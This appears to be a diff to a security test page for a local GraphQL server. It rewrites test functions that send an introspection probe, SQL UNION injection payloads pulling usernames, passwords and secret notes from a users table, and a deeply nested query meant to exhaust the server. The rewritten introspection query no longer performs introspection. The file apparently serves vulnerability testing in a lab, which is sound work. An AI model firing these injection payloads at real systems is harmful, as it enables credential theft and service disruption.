@@ -15,22 +15,7 @@
 
     <script>
     function testIntrospection() {
-        const query = `
-            query IntrospectionQuery {
-                __schema {
-                    queryType { name }
-                    mutationType { name }
-                    types {
-                        name
-                        kind
-                        fields {
-                            name
-                            type { name }
-                        }
-                    }
-                }
-            }
-        `;
+        const query = `{introspectionEnabled}`;
         
         fetch('http://localhost:8080/graphql', {
             method: 'POST',
@@ -47,16 +32,7 @@
     }
     
     function testSQLInjectionQuery() {
-        const query = `
-            query {
-                user(username: "admin' UNION SELECT null,username,password,email,role,null,null FROM users--") {
-                    id
-                    username
-                    email
-                    role
-                }
-            }
-        `;
+        const query = `{user(username:"admin' UNION SELECT null,username,password,email,role,null,null FROM users--"){id username email role}}`;
         
         fetch('http://localhost:8080/graphql', {
             method: 'POST',
@@ -73,16 +49,7 @@
     }
     
     function testUnionInjection() {
-        const query = `
-            query {
-                products(category: "Electronics' UNION SELECT id,username,password,email,role,secretNotes FROM users--") {
-                    id
-                    name
-                    price
-                    internalNotes
-                }
-            }
-        `;
+        const query = `{products(category:"Electronics' UNION SELECT id,username,password,email,role,secretNotes FROM users--"){id name price internalNotes}}`;
         
         fetch('http://localhost:8080/graphql', {
             method: 'POST',
@@ -99,28 +66,7 @@
     }
     
     function testDepthAttack() {
-        const query = `
-            query {
-                users {
-                    id
-                    username
-                    orders: orders(userId: 1) {
-                        id
-                        product: product(id: 1) {
-                            id
-                            name
-                            orders: orders(userId: 1) {
-                                id
-                                product: product(id: 1) {
-                                    id
-                                    name
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        `;
+        const query = `{users{id username orders(userId:1){id product{id name orders(userId:1){id product{id name}}}}}}`;
         
         fetch('http://localhost:8080/graphql', {
             method: 'POST',
